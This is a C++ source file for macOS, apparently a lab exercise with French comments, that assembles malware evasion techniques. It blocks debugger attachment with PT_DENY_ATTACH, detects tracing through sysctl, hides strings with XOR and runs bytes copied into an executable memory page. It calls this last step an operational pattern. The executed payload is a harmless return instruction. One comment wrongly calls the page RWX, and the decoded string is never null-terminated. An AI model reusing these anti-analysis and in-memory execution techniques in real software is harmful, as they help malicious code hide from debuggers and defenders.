// language: C++, file: star_evasion_mac.cpp, target: macOS (lab)
// Evasion : anti-debug (deny attach + detection traceur), string xor, exec memoire
#include <sys/types.h>
#include <sys/sysctl.h>
#include <sys/ptrace.h>
#include <mach/mach.h>
#include <unistd.h>
#include <cstdio>
#include <cstring>

// strings jamais en clair : xor a la volee
static void dexor(char* s, const char* src, size_t n, char k) {
    for (size_t i = 0; i < n; i++) s[i] = src[i] ^ k;
}

static bool debugger_present() {
    int mib[4] = { CTL_KERN, KERN_PROC, KERN_PROC_PID, getpid() };
    struct kinfo_proc info{};
    size_t sz = sizeof(info);
    sysctl(mib, 4, &info, &sz, NULL, 0);
    return (info.kp_proc.p_flag & P_TRACED) != 0;
}

int main() {
    // refuse tout attacheur futur (ptrace deny) - un debugger ne pourra pas s'attacher
    ptrace(PT_DENY_ATTACH, 0, NULL, 0);

    char msg[32];
    dexor(msg, "\x29\x2e\x3f\x3b\x36\x2e\x32\x7a\x37\x35\x3e\x3f", 12, 0x5A);
    printf("debugger: %s\n", debugger_present() ? "PRESENT (marche arriere)" : "aucun");
    printf("message dexor : %s\n", msg);
    printf("pid: %d - deny-attach actif\n", getpid());

    // exec memoire : copie de code dans une page RWX et appel (pattern mac)
    // RET arm64 : les mac Apple Silicon exigent le code natif de l'arche
#if defined(__aarch64__)
    unsigned char shell[] = { 0xC0, 0x03, 0x5F, 0xD6 }; // RET (arm64, inoffensif)
#else
    unsigned char shell[] = { 0x55, 0x48, 0x89, 0xE5, 0xC3 }; // prologue+ret (x64)
#endif
    vm_address_t addr;
    // Apple Silicon = W^X : RW pour ecrire, puis RX pour executer (jamais les deux)
    kern_return_t kr = vm_allocate(mach_task_self(), &addr, 4096, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) { printf("[X] vm_allocate %d\n", kr); return 1; }
    memcpy((void*)addr, shell, sizeof(shell));
    kr = vm_protect(mach_task_self(), addr, 4096, 0, VM_PROT_READ | VM_PROT_EXECUTE);
    if (kr != KERN_SUCCESS) { printf("[X] vm_protect %d\n", kr); return 1; }
    ((void(*)())addr)();
    printf("[OK] page RWX + exec memoire : pattern operationnel\n");
    return 0;
}
